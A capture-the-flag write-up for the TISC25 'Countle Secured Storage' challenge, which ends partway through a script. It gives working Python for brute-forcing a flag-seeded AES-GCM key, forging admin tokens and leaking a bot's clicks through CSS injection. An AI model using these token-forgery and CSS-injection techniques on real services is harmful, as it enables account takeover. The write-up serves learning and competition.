# Level-10 - Countle Secured Storage

DESCRIPTION

Deep within Mount Countle, thousands of expert gophers have constructed what is believed to be an impenetrable vault for SPECTRE's most classified secrets. Recent intel has revealed 

blueprints for an adjacent "admin_bot" service, but the inner workings of "Countle Secured Storage" remains shrouded in mystery.

Can you succeed where others have failed and penetrate the impenetrable?

http://chals.tisc25.ctf.sg:23196

attached files

countle-secured-storage.zip

---

So this how the website looks like.

<img width="1655" height="867" alt="image" src="https://github.com/user-attachments/assets/0b426a0f-4a82-4f25-b85e-d59fa39f4bce" />

There is an initialize vault button (registration) button and an access secret (login) button.

After registering and loging in, I could view my own secret if I could solve a countle twice in a row ðŸ’€ðŸ’€ðŸ’€.

After searching the website, I relunctently opened IDA and checked the server file.

With the help of CHAT, I properly decompiled each request properly and noted on how to use them.

1. HandleLogin, POST, /api/login -> Allows us to login into the website if username and password given are valid, when successful a token for our username is given.
   
2. HandleRegister, POST, /api/register -> Allows us to register an account into the website by providing a valid username and password, when successful a token for our username is given.
   
3. HandleMe, GET, /api/me -> When made with a header containing a valid Authorization token, the username, bio and style color associated with that token is returned.
   
4. HandleGetViews, GET, /api/views -> When made with a header containing a valid Authorization token, returns infomation of users who visted the user associated with that token along with the timestamps of when they visited.
   
5. HandleGetProfile, GET, /api/profile/:username -> The :username is replaced by a user you want to visit, if an authorization header is given the user assocaited with that token will be shown to have viewed the :username's profile, else the name of the person that viewed :username's profile will be annoynomous. When successful, returns the username, bio and style color of :username.
    
6. HandleStyleColorUpdate, POST, /api/update_style -> When made with a header containing a valid Authorization token, the user associated with that token will have their style color updated to whatever was sent.
    
7. HandleUnlockRequest, GET, /api/vault_unlock_request -> When made with a header containing a valid Authorization token, if an OTP has not been generated for ther user associated with the token, an OTP will be generated for them.
    
8. HandleUnlockAttempt, POST, /api/vault_unlock_attempt -> When made with a header containing a valid Authorization token along with an operations header, the server validates whether the data in the operations header is a valid solution for the OTP. If valid, authentication level increases by 1 and returns the secret of the user if it increases to 2, if invalid, authentication level falls back to 0 and a new OTP is generated.
    
9. HandleCheckSecret, POST, /api/vault_check -> When made with a header containing a valid Authorization token, the server initialises a bot to check whether the current OTP is solvable, returns "OK" if solvable else generates a new OTP.

When looking through the server file and seeing where the FLAG in the environment was used, I found out that whenever a user is registered an admin account for that user is also registered. The admin's account password is a random 16 character string selected from 89 characters and its secret is the FLAG!!! Another part where the flag was used was in generating the AES-key that validates and generates the token associated to a user with AES-GCM. The token was generated by encrypting the username with a random 12 byte nonce and validation was done by decrytping the token and checking whether it was valid.

From there I honestly pretty much figured I had to somehow forge and admin token as bruteforcing the password seemed impossible. 

The problem is how tho.

Since I couldnt read Go, decompiled or not, I pasted the key generation, encryption and decryption pseudocode into CHAT.

And... it told me they all look secure.

So I spent the rest of my time thinking how I could forge a token.

Below was the conversation I had with my Notepad.exe.

```
WHERE IS FLAG, FLAG is in the vault of any admin account
an admin account is created when you register any single ####### user
the account will have username admin_[wtv] but i cant make a admin_[wtv] since need alpha num
TO access an admin account i must either get their password but that is 89**16 or to forge a token
but the token looks unforgable unless i can get H / AESenck(0**128) somewhere
i think i should focus on getting an admin token somehow 
i can generate as many tokens as i want for a given pt
but nonce collision seems unlikely as well since it looks like nonce generation is random and not seeded 
so what can infinitely (nonce_n, token, pt) tuples can help me do?
i mean since i know pt i can get the keystream but then again i need to have H to forge and admin token 
but what is there some GHASH vuln im unaware of where maybe H is calculatable somehow / not need to get a tag?
```
After slowly consolidating the facts, I knew nonce collision was very unlikely, guessing the password was also very unlikely, the AES_enc of (b'\x00'*128) was also no where in the server, I also searched for any vulns in the GHASH algorithm but non of them were applicable in our case.

So with nothing else to try, I tried to at least generate the key from a fake flag since the key generation is deterministic. Even though I couldnt tell how the key was generated yet, I knew it was deterministic as when I restarted my own local server and used the token of a username to do anything in the new server, I get a username does not exist error instead of an invalid token error.

So I downloaded Go, moved the .tar.gz to my WSL and ran the command

```bash
tar -C /usr/local go1.25.1.linux-amd64.tar.gz
```

I now have Go on my WSL...

Anyways, I asked CHAT to convert the key generation psue-GO-code from the binary to actual Go code.

With each Go code CHAT gave me, I generated a key with 

```bash
go run go.go
```

and with each key I tried to decrypt a local token with my favourite PyCryptoDome.

I had to tell CHAT it was wrong over and over again as the codes it was given me were generating keys that could not decrypt the token.

Finally CHAT gave me,

```go
package main

import (
	"crypto/sha1"
	"encoding/binary"
	"fmt"
	"math/rand"
)

func generateKey() [16]byte {
	s := "INSERT FLAG HERE"
	if s == "" {
		panic("FLAG must be set")
	}

	b := []byte(s)

	// Sum like the asm: digest.Sum(b) returns append(b, digest...)
	h := sha1.New()
	h.Write(b)
	sumAppended := h.Sum(b) // b || sha1(b)

	// Seed = first 8 bytes (little-endian) of (b || sha1(b))
	seed := int64(binary.LittleEndian.Uint64(sumAppended[:8]))

	src := rand.NewSource(seed)

	// Warm-up: discard 256 draws
	for i := 0; i < 256; i++ {
		_ = src.Int63()
	}

	// Take low 8 bits of each subsequent draw for 16 bytes
	var out [16]byte
	for i := 0; i < 16; i++ {
		out[i] = byte(src.Int63())
	}
	return out
}

func main() {
	key := generateKey()
	fmt.Printf("%x\n", key)
}
```

And I could finally decrypt a local token with the key the code gave me.

So, even, I noticed from the code above (with the help of comments), that when the seed for generating the key was being set, the seed is seeded with the first 8 bytes of the flag, what the helly. 

So all we had to do was bruteforce the 6th - 8th byte of the flag, since the first 5 bytes were "TISC{",  to generate the key the remote server uses.

Then I encountered a very serious problem, the code to generate the key is written in Go.

So I did what any sane person would do, I asked CHAT to implement Go's random in python and after many unsuccessful attempts it finally worked. Now I just had to do the bruteforce script for the key.

```python
from Crypto.Cipher import AES 

pre = "TISC{"
token = "e6bd56ec0ddef5e077585320e48a9f6f23129085011d43251bfc093a36da0b3f782764c6b2" # Token from the remote server
token = bytes.fromhex(token)
import hashlib

# ---- Go math/rand rng.go constants & cooked table (ported verbatim) ----
RNG_LEN = 607
RNG_TAP = 273
RNG_MAX = 1 << 63
RNG_MASK = RNG_MAX - 1
INT32_MAX = (1 << 31) - 1

RNG_COOKED = [
    -4181792142133755926, -4576982950128230565, 1395769623340756751, 5333664234075297259,
		-6347679516498800754, 9033628115061424579, 7143218595135194537, 4812947590706362721,
		7937252194349799378, 5307299880338848416, 8209348851763925077, -7107630437535961764,
		4593015457530856296, 8140875735541888011, -5903942795589686782, -603556388664454774,
		-7496297993371156308, 113108499721038619, 4569519971459345583, -4160538177779461077,
		-6835753265595711384, -6507240692498089696, 6559392774825876886, 7650093201692370310,
		7684323884043752161, -8965504200858744418, -2629915517445760644, 271327514973697897,
		-6433985589514657524, 1065192797246149621, 3344507881999356393, -4763574095074709175,
		7465081662728599889, 1014950805555097187, -4773931307508785033, -5742262670416273165,
		2418672789110888383, 5796562887576294778, 4484266064449540171, 3738982361971787048,
		-4699774852342421385, 10530508058128498, -589538253572429690, -6598062107225984180,
		8660405965245884302, 10162832508971942, -2682657355892958417, 7031802312784620857,
		6240911277345944669, 831864355460801054, -1218937899312622917, 2116287251661052151,
		2202309800992166967, 9161020366945053561, 4069299552407763864, 4936383537992622449,
		457351505131524928, -8881176990926596454, -6375600354038175299, -7155351920868399290,
		4368649989588021065, 887231587095185257, -3659780529968199312, -2407146836602825512,
		5616972787034086048, -751562733459939242, 1686575021641186857, -5177887698780513806,
		-4979215821652996885, -1375154703071198421, 5632136521049761902, -8390088894796940536,
		-193645528485698615, -5979788902190688516, -4907000935050298721, -285522056888777828,
		-2776431630044341707, 1679342092332374735, 6050638460742422078, -2229851317345194226,
		-1582494184340482199, 5881353426285907985, 812786550756860885, 4541845584483343330,
		-6497901820577766722, 4980675660146853729, -4012602956251539747, -329088717864244987,
		-2896929232104691526, 1495812843684243920, -2153620458055647789, 7370257291860230865,
		-2466442761497833547, 4706794511633873654, -1398851569026877145, 8549875090542453214,
		-9189721207376179652, -7894453601103453165, 7297902601803624459, 1011190183918857495,
		-6985347000036920864, 5147159997473910359, -8326859945294252826, 2659470849286379941,
		6097729358393448602, -7491646050550022124, -5117116194870963097, -896216826133240300,
		-745860416168701406, 5803876044675762232, -787954255994554146, -3234519180203704564,
		-4507534739750823898, -1657200065590290694, 505808562678895611, -4153273856159712438,
		-8381261370078904295, 572156825025677802, 1791881013492340891, 3393267094866038768,
		-5444650186382539299, 2352769483186201278, -7930912453007408350, -325464993179687389,
		-3441562999710612272, -6489413242825283295, 5092019688680754699, -227247482082248967,
		4234737173186232084, 5027558287275472836, 4635198586344772304, -536033143587636457,
		5907508150730407386, -8438615781380831356, 972392927514829904, -3801314342046600696,
		-4064951393885491917, -174840358296132583, 2407211146698877100, -1640089820333676239,
		3940796514530962282, -5882197405809569433, 3095313889586102949, -1818050141166537098,
		5832080132947175283, 7890064875145919662, 8184139210799583195, -8073512175445549678,
		-7758774793014564506, -4581724029666783935, 3516491885471466898, -8267083515063118116,
		6657089965014657519, 5220884358887979358, 1796677326474620641, 5340761970648932916,
		1147977171614181568, 5066037465548252321, 2574765911837859848, 1085848279845204775,
		-5873264506986385449, 6116438694366558490, 2107701075971293812, -7420077970933506541,
		2469478054175558874, -1855128755834809824, -5431463669011098282, -9038325065738319171,
		-6966276280341336160, 7217693971077460129, -8314322083775271549, 7196649268545224266,
		-3585711691453906209, -5267827091426810625, 8057528650917418961, -5084103596553648165,
		-2601445448341207749, -7850010900052094367, 6527366231383600011, 3507654575162700890,
		9202058512774729859, 1954818376891585542, -2582991129724600103, 8299563319178235687,
		-5321504681635821435, 7046310742295574065, -2376176645520785576, -7650733936335907755,
		8850422670118399721, 3631909142291992901, 5158881091950831288, -6340413719511654215,
		4763258931815816403, 6280052734341785344, -4979582628649810958, 2043464728020827976,
		-2678071570832690343, 4562580375758598164, 5495451168795427352, -7485059175264624713,
		553004618757816492, 6895160632757959823, -989748114590090637, 7139506338801360852,
		-672480814466784139, 5535668688139305547, 2430933853350256242, -3821430778991574732,
		-1063731997747047009, -3065878205254005442, 7632066283658143750, 6308328381617103346,
		3681878764086140361, 3289686137190109749, 6587997200611086848, 244714774258135476,
		-5143583659437639708, 8090302575944624335, 2945117363431356361, -8359047641006034763,
		3009039260312620700, -793344576772241777, 401084700045993341, -1968749590416080887,
		4707864159563588614, -3583123505891281857, -3240864324164777915, -5908273794572565703,
		-3719524458082857382, -5281400669679581926, 8118566580304798074, 3839261274019871296,
		7062410411742090847, -8481991033874568140, 6027994129690250817, -6725542042704711878,
		-2971981702428546974, -7854441788951256975, 8809096399316380241, 6492004350391900708,
		2462145737463489636, -8818543617934476634, -5070345602623085213, -8961586321599299868,
		-3758656652254704451, -8630661632476012791, 6764129236657751224, -709716318315418359,
		-3403028373052861600, -8838073512170985897, -3999237033416576341, -2920240395515973663,
		-2073249475545404416, 368107899140673753, -6108185202296464250, -6307735683270494757,
		4782583894627718279, 6718292300699989587, 8387085186914375220, 3387513132024756289,
		4654329375432538231, -292704475491394206, -3848998599978456535, 7623042350483453954,
		7725442901813263321, 9186225467561587250, -5132344747257272453, -6865740430362196008,
		2530936820058611833, 1636551876240043639, -3658707362519810009, 1452244145334316253,
		-7161729655835084979, -7943791770359481772, 9108481583171221009, -3200093350120725999,
		5007630032676973346, 2153168792952589781, 6720334534964750538, -3181825545719981703,
		3433922409283786309, 2285479922797300912, 3110614940896576130, -2856812446131932915,
		-3804580617188639299, 7163298419643543757, 4891138053923696990, 580618510277907015,
		1684034065251686769, 4429514767357295841, -8893025458299325803, -8103734041042601133,
		7177515271653460134, 4589042248470800257, -1530083407795771245, 143607045258444228,
		246994305896273627, -8356954712051676521, 6473547110565816071, 3092379936208876896,
		2058427839513754051, -4089587328327907870, 8785882556301281247, -3074039370013608197,
		-637529855400303673, 6137678347805511274, -7152924852417805802, 5708223427705576541,
		-3223714144396531304, 4358391411789012426, 325123008708389849, 6837621693887290924,
		4843721905315627004, -3212720814705499393, -3825019837890901156, 4602025990114250980,
		1044646352569048800, 9106614159853161675, -8394115921626182539, -4304087667751778808,
		2681532557646850893, 3681559472488511871, -3915372517896561773, -2889241648411946534,
		-6564663803938238204, -8060058171802589521, 581945337509520675, 3648778920718647903,
		-4799698790548231394, -7602572252857820065, 220828013409515943, -1072987336855386047,
		4287360518296753003, -4633371852008891965, 5513660857261085186, -2258542936462001533,
		-8744380348503999773, 8746140185685648781, 228500091334420247, 1356187007457302238,
		3019253992034194581, 3152601605678500003, -8793219284148773595, 5559581553696971176,
		4916432985369275664, -8559797105120221417, -5802598197927043732, 2868348622579915573,
		-7224052902810357288, -5894682518218493085, 2587672709781371173, -7706116723325376475,
		3092343956317362483, -5561119517847711700, 972445599196498113, -1558506600978816441,
		1708913533482282562, -2305554874185907314, -6005743014309462908, -6653329009633068701,
		-483583197311151195, 2488075924621352812, -4529369641467339140, -4663743555056261452,
		2997203966153298104, 1282559373026354493, 240113143146674385, 8665713329246516443,
		628141331766346752, -4651421219668005332, -7750560848702540400, 7596648026010355826,
		-3132152619100351065, 7834161864828164065, 7103445518877254909, 4390861237357459201,
		-4780718172614204074, -319889632007444440, 622261699494173647, -3186110786557562560,
		-8718967088789066690, -1948156510637662747, -8212195255998774408, -7028621931231314745,
		2623071828615234808, -4066058308780939700, -5484966924888173764, -6683604512778046238,
		-6756087640505506466, 5256026990536851868, 7841086888628396109, 6640857538655893162,
		-8021284697816458310, -7109857044414059830, -1689021141511844405, -4298087301956291063,
		-4077748265377282003, -998231156719803476, 2719520354384050532, 9132346697815513771,
		4332154495710163773, -2085582442760428892, 6994721091344268833, -2556143461985726874,
		-8567931991128098309, 59934747298466858, -3098398008776739403, -265597256199410390,
		2332206071942466437, -7522315324568406181, 3154897383618636503, -7585605855467168281,
		-6762850759087199275, 197309393502684135, -8579694182469508493, 2543179307861934850,
		4350769010207485119, -4468719947444108136, -7207776534213261296, -1224312577878317200,
		4287946071480840813, 8362686366770308971, 6486469209321732151, -5605644191012979782,
		-1669018511020473564, 4450022655153542367, -7618176296641240059, -3896357471549267421,
		-4596796223304447488, -6531150016257070659, -8982326463137525940, -4125325062227681798,
		-1306489741394045544, -8338554946557245229, 5329160409530630596, 7790979528857726136,
		4955070238059373407, -4304834761432101506, -6215295852904371179, 3007769226071157901,
		-6753025801236972788, 8928702772696731736, 7856187920214445904, -4748497451462800923,
		7900176660600710914, -7082800908938549136, -6797926979589575837, -6737316883512927978,
		4186670094382025798, 1883939007446035042, -414705992779907823, 3734134241178479257,
		4065968871360089196, 6953124200385847784, -7917685222115876751, -7585632937840318161,
		-5567246375906782599, -5256612402221608788, 3106378204088556331, -2894472214076325998,
		4565385105440252958, 1979884289539493806, -6891578849933910383, 3783206694208922581,
		8464961209802336085, 2843963751609577687, 3030678195484896323, -4429654462759003204,
		4459239494808162889, 402587895800087237, 8057891408711167515, 4541888170938985079,
		1042662272908816815, -3666068979732206850, 2647678726283249984, 2144477441549833761,
		-3417019821499388721, -2105601033380872185, 5916597177708541638, -8760774321402454447,
		8833658097025758785, 5970273481425315300, 563813119381731307, -6455022486202078793,
		1598828206250873866, -4016978389451217698, -2988328551145513985, -6071154634840136312,
		8469693267274066490, 125672920241807416, -3912292412830714870, -2559617104544284221,
		-486523741806024092, -4735332261862713930, 5923302823487327109, -9082480245771672572,
		-1808429243461201518, 7990420780896957397, 4317817392807076702, 3625184369705367340,
		-6482649271566653105, -3480272027152017464, -3225473396345736649, -368878695502291645,
		-3981164001421868007, -8522033136963788610, 7609280429197514109, 3020985755112334161,
		-2572049329799262942, 2635195723621160615, 5144520864246028816, -8188285521126945980,
		1567242097116389047, 8172389260191636581, -2885551685425483535, -7060359469858316883,
		-6480181133964513127, -7317004403633452381, 6011544915663598137, 5932255307352610768,
		2241128460406315459, -8327867140638080220, 3094483003111372717, 4583857460292963101,
		9079887171656594975, -384082854924064405, -3460631649611717935, 4225072055348026230,
		-7385151438465742745, 3801620336801580414, -399845416774701952, -7446754431269675473,
		7899055018877642622, 5421679761463003041, 5521102963086275121, -4975092593295409910,
		8735487530905098534, -7462844945281082830, -2080886987197029914, -1000715163927557685,
		-4253840471931071485, -5828896094657903328, 6424174453260338141, 359248545074932887,
		-5949720754023045210, -2426265837057637212, 3030918217665093212, -9077771202237461772,
		-3186796180789149575, 740416251634527158, -2142944401404840226, 6951781370868335478,
		399922722363687927, -8928469722407522623, -1378421100515597285, -8343051178220066766,
		-3030716356046100229, -8811767350470065420, 9026808440365124461, 6440783557497587732,
		4615674634722404292, 539897290441580544, 2096238225866883852, 8751955639408182687,
		-7316147128802486205, 7381039757301768559, 6157238513393239656, -1473377804940618233,
		8629571604380892756, 5280433031239081479, 7101611890139813254, 2479018537985767835,
		7169176924412769570, -1281305539061572506, -7865612307799218120, 2278447439451174845,
		3625338785743880657, 6477479539006708521, 8976185375579272206, -3712000482142939688,
		1326024180520890843, 7537449876596048829, 5464680203499696154, 3189671183162196045,
		6346751753565857109, -8982212049534145501, -6127578587196093755, -245039190118465649,
		-6320577374581628592, 7208698530190629697, 7276901792339343736, -7490986807540332668,
		4133292154170828382, 2918308698224194548, -7703910638917631350, -3929437324238184044,
		-4300543082831323144, -6344160503358350167, 5896236396443472108, -758328221503023383,
		-1894351639983151068, -307900319840287220, -6278469401177312761, -2171292963361310674,
		8382142935188824023, 9103922860780351547, 4152330101494654406,
]

def to_u64(n: int) -> int:
    return n & ((1 << 64) - 1)

def to_i64(u: int) -> int:
    return u - (1 << 64) if u >= (1 << 63) else u

def seedrand(x: int) -> int:
    # x[n+1] = 48271 * x[n] mod (2^31 - 1)
    A, Q, R = 48271, 44488, 3399
    hi = x // Q
    lo = x % Q
    x = A * lo - R * hi
    if x < 0:
        x += INT32_MAX
    return x

class GoMathRandSource:
    def __init__(self, seed: int):
        self.tap = 0
        self.feed = RNG_LEN - RNG_TAP
        self.vec = [0] * RNG_LEN
        self.seed(seed)

    def seed(self, seed: int):
        self.tap = 0
        self.feed = RNG_LEN - RNG_TAP

        seed = seed % INT32_MAX
        if seed < 0:
            seed += INT32_MAX
        if seed == 0:
            seed = 89482311

        x = int(seed)
        for i in range(-20, RNG_LEN):
            x = seedrand(x)
            if i >= 0:
                u = to_u64(int(x) << 40)
                x = seedrand(x)
                u ^= to_u64(int(x) << 20)
                x = seedrand(x)
                u ^= to_u64(int(x))
                u ^= to_u64(RNG_COOKED[i])
                self.vec[i] = to_i64(u)

    def uint64(self) -> int:
        self.tap -= 1
        if self.tap < 0:
            self.tap += RNG_LEN
        self.feed -= 1
        if self.feed < 0:
            self.feed += RNG_LEN

        x_u = to_u64(self.vec[self.feed] + self.vec[self.tap])
        self.vec[self.feed] = to_i64(x_u)  # store back as signed int64
        return x_u

    def int63(self) -> int:
        return self.uint64() & RNG_MASK

def generate_key(s) -> bytes:
    b = s.encode("utf-8")
    # Go's h.Sum(b) == append(b, sha1(b)...)
    sum_appended = b + hashlib.sha1(b).digest()

    # Little-endian uint64 from first 8 bytes of (b || sha1(b)), then cast to int64
    seed_u = int.from_bytes(sum_appended[:8], "little", signed=False)
    seed = to_i64(seed_u)

    src = GoMathRandSource(seed)

    # Warm-up: discard 256 draws
    for _ in range(256):
        _ = src.int63()

    # Take low 8 bits from each subsequent draw for 16 bytes
    out = bytearray(16)
    for i in range(16):
        out[i] = src.int63() & 0xFF
    return bytes(out)

brrrrr = 0
for i in range(48,123):
    if brrrrr == 1:
        break
    for j in range(48,123):
        if brrrrr == 1:
            break
        for k in range(48,123):
            suffix = chr(i) + chr(j) + chr(k)
            fla = pre + suffix
            key = generate_key(fla)
            print(fla)
            cipher = AES.new(key, AES.MODE_GCM, nonce=token[:12])
            try:
                cipher.decrypt_and_verify(token[12:-16], token[-16:])
                print(key)
                brrrrr = 1
                break
            except:
                pass
```

Can you tell which parts were written by me?

Anyways, inititally when I ran the script, it ended with the last few outputs beng posssible prefixes that were all the way at the end and not the key, then I realised I forgot to place a break condition.

Anyways, I then placed a break condition and ran the script, it ended with the last few outputs being possible prefixes and not the key, then I realised I did not place a break condition for the other loop.

Anyways, I then placed another break condition and ran the script and finally got

```
TISC{1t_
b'\x8f\x7f\xd24\xbaM\x90\xf2^/\xb8\xf3L\xfd\x10D'
```

Okay we are finally getting somewhere.

I can now forge the token for any username.

Now we can finally forge an admin account's token and possible reveal their secret to get the flag.

And the only way to do so was to authenticate with the OTP.

But how?

The OTP of an account is never revealed to us but only to the bot and the server logs.

I analysied the bot's script and it was essentially a selenium script that checks whether the OTP by running a depth first search with the initial numbers to see whether reaching the OTP is possible. Once it determines it is possible, it clicks the buttons on the website in a correct sequence such that the result is the OTP and then responds back to the server.

Why does the bot need to click on the buttons? Why can it not just tell the server once it is completed with its DFS?

This was sus AF ONG.

I then checked the .js files on the OTP page and found this .js file.

```js
import {t as u, o} from "./chunk-D4RADZKF-BaLaEziy.js";
/* empty css             */
const f = {
    maxCssLength: 65536,
    allowedProperties: new Set(["color", "font-family", "font-size", "font-weight", "line-height", "text-align", "text-decoration", "text-transform", "letter-spacing", "display", "width", "height", "max-width", "max-height", "min-width", "min-height", "margin", "padding", "border", "background-color", "opacity", "box-shadow", "transform", "transition", "background", "animation", "animation-delay", "animation-direction", "animation-duration", "animation-fill-mode", "animation-iteration-count", "animation-name", "animation-play-state", "animation-timing-function", "cursor", "pointer-events", "user-select", "visibility", "word-break", "word-wrap", "overflow", "text-overflow", "clip-path", "filter", "position", "top", "right", "bottom", "left", "z-index", "float", "clear", "object-fit", "object-position", "content", "overflow-x", "overflow-y", "text-shadow", "vertical-align", "white-space", "border-radius", "justify-content", "align-items", "flex-wrap", "flex-direction", "flex"]),
    allowedAtRules: new Set(["@media", "@keyframes", "@font-face", "@import"]),
    allowedPseudoClasses: new Set([":hover", ":active", ":focus", ":visited", ":first-child", ":last-child", ":nth-child", ":nth-of-type", ":not", ":before", ":after"]),
    validateUrl: s => {
        try {
            return new URL(s),
            !0
        } catch {
            return !1
        }
    }
    ,
    sanitizeUrl: s => {
        const e = ["fonts.googleapis.com"];
        if (s) {
            const a = new URL(s);
            if (e.includes(a.hostname))
                return s
        }
        return ""
    }
};
class w {
    constructor(e={}) {
        this.config = {
            ...f,
            ...e
        },
        this.config.allowedProperties = new Set([...f.allowedProperties, ...e.allowedProperties || []]),
        this.config.allowedAtRules = new Set([...f.allowedAtRules, ...e.allowedAtRules || []]),
        this.config.allowedPseudoClasses = new Set([...f.allowedPseudoClasses, ...e.allowedPseudoClasses || []])
    }
    sanitizeProperty(e, a) {
        if (!this.config.allowedProperties.has(e))
            return "";
        if (e === "background-image" || e === "background") {
            const r = a.match(/url\(['"]?(.*?)['"]?\)/);
            if (r) {
                const n = r[1];
                if (this.config.validateUrl(n)) {
                    const t = this.config.sanitizeUrl(n);
                    if (t)
                        return `${e}: url('${t}');`
                }
                return ""
            }
        }
        return `${e}: ${a};`
    }
    sanitizeCss(e) {
        if (typeof e != "string" || (e = e.trim(),
        e === ""))
            return "";
        e.length > this.config.maxCssLength && (e = e.slice(0, this.config.maxCssLength)),
        e = e.replace(/\/\*[\s\S]*?\*\//g, "");
        let a = ""
          , r = 0
          , n = !1
          , t = "";
        for (let l = 0; l < e.length; l++) {
            const i = e[l];
            if (i === "{") {
                r++;
                const c = t.trim().split(/\s+/)[0];
                this.config.allowedAtRules.has(c) ? (n = !0,
                a += t + i) : (n || r === 1) && (a += t + i),
                t = ""
            } else if (i === "}") {
                if (r--,
                n)
                    r === 0 && (n = !1),
                    a += t + i;
                else if (r === 0) {
                    const h = t.split(";").filter(d => d.trim() !== "").map(d => {
                        const [m,...g] = d.split(":")
                          , p = g.join(":").trim();
                        return this.sanitizeProperty(m.trim(), p)
                    }
                    ).filter(d => d !== "");
                    a += h.join(" ") + i
                } else
                    a += t + i;
                t = ""
            } else
                t += i
        }
        return a
    }
}
const y = ({profile: s, editable: e}) => {
    const [a,r] = u.useState(s.style_color)
      , [n,t] = u.useState(s.style_color)
      , l = new w;
    return o.jsxs("div", {
        className: "avatar-section",
        children: [o.jsx("style", {
            children: l.sanitizeCss(`
            .vault-username {
                color: ${n};
                text-shadow: 0 0 10px ${n}40;
            }
            `.toLowerCase())
        }), o.jsxs("div", {
            className: "avatar-container",
            children: [o.jsxs("div", {
                className: "vault-avatar",
                children: [o.jsx("div", {
                    className: "avatar-ring"
                }), o.jsx("div", {
                    className: "avatar-letter",
                    children: s.username.charAt(0).toUpperCase()
                }), o.jsx("div", {
                    className: "avatar-glow"
                })]
            }), o.jsxs("div", {
                className: "username-container",
                children: [o.jsxs("h3", {
                    className: "vault-username",
                    children: ["@", s.username]
                }), e && o.jsx("div", {
                    className: "color-picker-container",
                    children: o.jsx("input", {
                        type: "color",
                        "aria-label": "Choose profile color",
                        value: a,
                        className: "vault-color-picker",
                        onChange: i => {
                            r(i.target.value)
                        }
                        ,
                        onBlur: i => {
                            t(i.target.value);
                            const c = new FormData;
                            c.append("style_color", i.target.value),
                            fetch("/api/update_style", {
                                method: "POST",
                                headers: {
                                    Authorization: localStorage.getItem("authToken") || ""
                                },
                                body: c
                            })
                        }
                    })
                })]
            })]
        })]
    })
}
;
export {y as P};
```

I then remembered that with the /api/update_style, I could set the {n} above to anything I want but it seems that my input was being sanitized. 

However it seems that I can still overide the styles of existing css elements on the website. 

So I first tried a simple payload to see if I could make any requests anywhere.

```code
curl -i -X POST http://localhost:8080/api/update_style -H "Authorization: $TOKEN" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "style_color=#000}.number-card{content: url('https://www.google.com')}/*"
```
gives me

```ruby
Refused to load the image 'https://www.google.com/' because it violates the following Content Security Policy directive: "img-src 'self'".
```

so it seems that I am unable to make any external request.

So clearly I had to use one of the api requests.

I first initially thought what if a could make a button, make a get request with headers to view my own profile so that when they are clicked by the bot, I get to see which button "viewed" my profile as well as the when it did.

But I could not find a way to set a header for any button. So, instead I tried to map each button to an individual profile then get the views on all those profiles and see when the views were made

After learning css and ALOT of trial and error, I constructed a script that would give me possible equations for an OTP.

Running this python script

```python
import requests

is_local = 0
link_pref = "http://localhost:8080" if is_local else "http://chals.tisc25.ctf.sg:23196"
k = b'\x8f\x7f\xd24\xbaM\x90\xf2^/\xb8\xf3L\xfd\x10D' if not is_local else bytes.fromhex("013ebdbe5471c64dbce8a3cc137c8b6f")

reg_url = f"{link_pref}" + "/api/register"
dummy_pref="riteup"

data = {"username": f"wholetmecook", "password": "12341234"}
r = requests.post(reg_url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})

from Crypto.Cipher import AES # pyCryptoDome
from Crypto.Util.number import long_to_bytes, bytes_to_long
from random import randbytes
iv = randbytes(12)
pt = "admin_wholetmecook".encode()
cipher = AES.new(k, AES.MODE_GCM, nonce=iv)
genciphertext, tag = cipher.encrypt_and_digest(pt)
adt = iv.hex() + genciphertext.hex() + tag.hex()

def token_2fa(t):
    print(f'localStorage.setItem("authToken", "{t}");\nlocation.href = "/2fa";')

token_2fa(adt)

dummyaccs = {}

def create_users():
        for j in range(5):
            u = f"{dummy_pref+'r'+str(j)}"
            data = {"username": f"{u}", "password": "12341234"}
            r = requests.post(reg_url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
            token_pro(u, r.json().get("token")) 
        users = ["x", "xx", "152", "1007", "plus", "minus", "mul", "div"]
        for u in users:
            data = {"username": f"{dummy_pref+u}", "password": "12341234"}
            r = requests.post(reg_url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
            token_pro(dummy_pref+u, r.json().get("token"))

def token_pro(u, t):
    print(u)
    dummyaccs[u] = t

create_users()
    
def make_operation():
    stri =""
    for i in range(5):
        stri += f".operation:nth-child({i+1})>.number-card--locked:nth-child(5)"+ "{content: url('/api/profile/" +f"{dummy_pref+'r'+str(i)}')" +"}"
    return stri

def make_filled():
    stri =""
    def repeat_1():
        x =""
        for i in range(1, 8):
            x += f".source-cards>.number-card:nth-child({i}).number-card--anim-popout:not(.number-card--2-chars):not(.number-card--3-chars):not(.number-card--4-chars)"+ "{content: url('/api/profile/" +f"{dummy_pref+'x'}')" +"}"
        return x
    def repeat_2():
        x =""
        for i in range(1, 8):
            x += f".source-cards>.number-card--2-chars.number-card--anim-popout:nth-child({i})"+ "{content: url('/api/profile/" +f"{dummy_pref+'xx'}')" +"}"
        return x
    def repeatop():
        x = ""
        ops = ["plus", "minus", "mul", "div"]
        for i in range(len(ops)):
            x += f".operators>.number-card--anim-popout:nth-child({str(i+1)})"+ "{content: url('/api/profile/" +f"{dummy_pref+ ops[i]}')" +"}"
        return x
    stri += repeatop()
    stri+=repeat_1()
    stri+=repeat_2()
    stri += f".source-cards>.number-card--3-chars.number-card--anim-popout"+ "{content: url('/api/profile/" +f"{dummy_pref+'152'}')" +"}"
    stri += f".source-cards>.number-card--4-chars.number-card--anim-popout"+ "{content: url('/api/profile/" +f"{dummy_pref+'1007'}')" +"}"
    return stri

pre ="#000; }"
pre += make_filled()
pre += make_operation()
pre += '/*"'

print(pre)

us_url = f"{link_pref}" + "/api/update_style"
data = {"style_color": f"{pre}"}
r = requests.post(us_url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded", "Authorization": f"{adt}"})
print(r.text)

tpreq_url = f"{link_pref}" + "/api/vault/unlock/request"
r = requests.get(tpreq_url, headers={"Authorization": f"{adt}"})
print(r.text)

ck_url = f"{link_pref}" + "/api/vault/check"
r = requests.post(ck_url, headers={"Authorization": f"{adt}"})
print(r.text)
print("\n")

v_url =f"{link_pref}" + "/api/views"
order =[]
for i in dummyaccs:
    adt = dummyaccs[i]
    r = requests.get(v_url, headers={"Authorization": f"{adt}"})
    print(r.json())
    try:
        order += r.json().get("views")
    except:
        pass

orderr = []
for i in order:
    u = i["username"]
    t = i["timestamp"][-9:-1]
    orderr += [(u, t)]
orderr.sort(key=lambda x: x[1])

c= 0 
ops =["plus", "minus", "mul", "div"]
used = []
l ="\n"
